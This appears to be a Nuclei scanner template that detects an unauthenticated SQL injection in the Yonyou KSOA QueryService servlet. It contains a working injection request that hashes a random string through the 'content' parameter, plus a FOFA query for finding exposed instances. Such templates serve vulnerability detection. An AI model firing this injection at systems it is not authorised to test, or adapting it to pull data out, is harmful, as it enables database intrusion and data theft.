id: yonyou-ksoa-queryservice-sqli

info:
  name: 用友时空 KSOA com.sksoft.bill.QueryService - sqli
  author: leadlife
  severity: high
  description: 用友时空 KSOA /servlet/com.sksoft.bill.QueryService 接口存在SQL注入漏洞，未经身份验证的远程攻击者通过利用SQL注入漏洞可以获取数据库中的敏感信息，导致数据泄露。
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: app="用友-时空KSOA"
  tags: sqli, yonyou, ksoa, oa

variables:
  str: "{{randstr}}"

http:
  - raw:
      - |
        GET /servlet/com.sksoft.bill.QueryService?service=query&content=SELECT%20HashBytes('md5','{{str}}'); HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "{{md5(str)}}"
